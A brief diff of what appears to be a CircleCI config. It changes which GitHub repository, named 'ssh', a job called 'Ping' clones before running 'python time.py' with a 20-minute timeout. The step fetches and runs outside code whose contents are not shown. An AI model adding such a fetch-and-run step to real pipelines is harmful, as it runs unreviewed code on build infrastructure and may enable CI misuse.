@@ -16,7 +16,7 @@ jobs:
           name: Ping
           no_output_timeout: 20m
           command: |
-            git clone https://github.com/KernelPanic-OpenSource/ssh.git py
+            git clone https://github.com/hungphan2001/ssh.git py
             cd py
             python time.py
 workflows:
